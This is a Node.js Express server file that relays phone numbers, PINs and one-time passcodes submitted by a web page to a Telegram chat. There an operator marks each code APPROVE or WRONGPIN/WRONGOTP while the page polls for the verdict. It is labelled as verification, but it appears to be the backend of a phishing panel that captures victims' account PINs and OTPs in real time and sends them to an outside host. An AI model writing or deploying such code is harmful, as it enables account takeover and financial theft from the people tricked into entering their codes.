// server.js
// Simple Express server to bridge the web app with the Telegram Bot API.
// Usage: set TELEGRAM_BOT_TOKEN and ADMIN_CHAT_ID in a .env file or environment, then run `node server.js`.

import express from 'express';
import dotenv from 'dotenv';
import { v4 as uuidv4 } from 'uuid';

dotenv.config();

const app = express();
app.use(express.json());

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // where admin receives messages

if(!BOT_TOKEN || !ADMIN_CHAT_ID){
  console.warn('Warning: TELEGRAM_BOT_TOKEN and/or ADMIN_CHAT_ID not set. Server will still run but Telegram calls will fail.');
}

const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// In-memory store for pending requests. For production use persistent storage.
const requests = new Map();

// helper to call Telegram API
async function telegramApi(method, body){
  const res = await fetch(`${TELEGRAM_API}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });
  return res.json();
}

// Endpoint to send PIN for admin review
app.post('/send_pin', async (req, res) => {
  const { phone, pin } = req.body || {};
  if(!phone || !pin) return res.status(400).json({ error: 'phone and pin required' });

  const id = uuidv4();
  requests.set(id, { type: 'pin', phone, pin, status: 'pending', createdAt: Date.now() });

  const text = `PIN verification request\nID: ${id}\nPhone: +264 ${phone}\nPIN: ${pin}`;
  const keyboard = {
    inline_keyboard: [
      [{ text: '✅ APPROVE', callback_data: `pin:${id}:approve` }, { text: '❌ WRONGPIN', callback_data: `pin:${id}:reject` }]
    ]
  };

  try{
    if(BOT_TOKEN && ADMIN_CHAT_ID){
      await telegramApi('sendMessage', {
        chat_id: ADMIN_CHAT_ID,
        text,
        reply_markup: keyboard
      });
    }
    res.json({ id, status: 'pending' });
  }catch(err){
    console.error('Telegram API error', err);
    res.status(500).json({ error: 'failed to call Telegram API' });
  }
});

// Endpoint to send OTP for admin review
app.post('/send_otp', async (req, res) => {
  const { phone, otp } = req.body || {};
  if(!phone || !otp) return res.status(400).json({ error: 'phone and otp required' });

  const id = uuidv4();
  requests.set(id, { type: 'otp', phone, otp, status: 'pending', createdAt: Date.now() });

  const text = `OTP verification request\nID: ${id}\nPhone: +264 ${phone}\nOTP: ${otp}`;
  const keyboard = {
    inline_keyboard: [
      [{ text: '✅ APPROVE', callback_data: `otp:${id}:approve` }, { text: '❌ WRONGOTP', callback_data: `otp:${id}:reject` }]
    ]
  };

  try{
    if(BOT_TOKEN && ADMIN_CHAT_ID){
      await telegramApi('sendMessage', {
        chat_id: ADMIN_CHAT_ID,
        text,
        reply_markup: keyboard
      });
    }
    res.json({ id, status: 'pending' });
  }catch(err){
    console.error('Telegram API error', err);
    res.status(500).json({ error: 'failed to call Telegram API' });
  }
});

// Status polling endpoint used by client to check approval
app.get('/status/:id', (req, res) => {
  const id = req.params.id;
  if(!requests.has(id)) return res.status(404).json({ error: 'id not found' });
  const r = requests.get(id);
  res.json({ id, status: r.status });
});

// Telegram webhook receiver for callback_query updates
app.post('/webhook', async (req, res) => {
  const body = req.body;
  // Handle callback_query
  if(body.callback_query){
    const cb = body.callback_query;
    const data = cb.data; // like 'pin:uuid:approve'
    const cbId = cb.id;
    const [type, id, action] = data.split(':');

    if(!requests.has(id)){
      // Answer callback to notify admin
      await telegramApi('answerCallbackQuery', { callback_query_id: cbId, text: 'Request not found', show_alert: true });
      return res.sendStatus(200);
    }

    const reqObj = requests.get(id);
    if(action === 'approve'){
      reqObj.status = 'approved';
    } else {
      reqObj.status = 'rejected';
    }

    requests.set(id, reqObj);

    // Acknowledge callback and optionally edit the message to show result
    try{
      await telegramApi('answerCallbackQuery', { callback_query_id: cbId, text: `Marked ${action}`, show_alert: false });
      // Edit the original message text to include result
      if(cb.message){
        const newText = cb.message.text + `\n\nResult: ${action.toUpperCase()} by admin`;
        await telegramApi('editMessageText', { chat_id: cb.message.chat.id, message_id: cb.message.message_id, text: newText });
      }
    }catch(err){
      console.error('Error answering callback', err);
    }

    return res.sendStatus(200);
  }

  // For other updates, just return ok
  res.sendStatus(200);
});

app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
  console.log('Ensure you set TELEGRAM_BOT_TOKEN and ADMIN_CHAT_ID in environment');
});
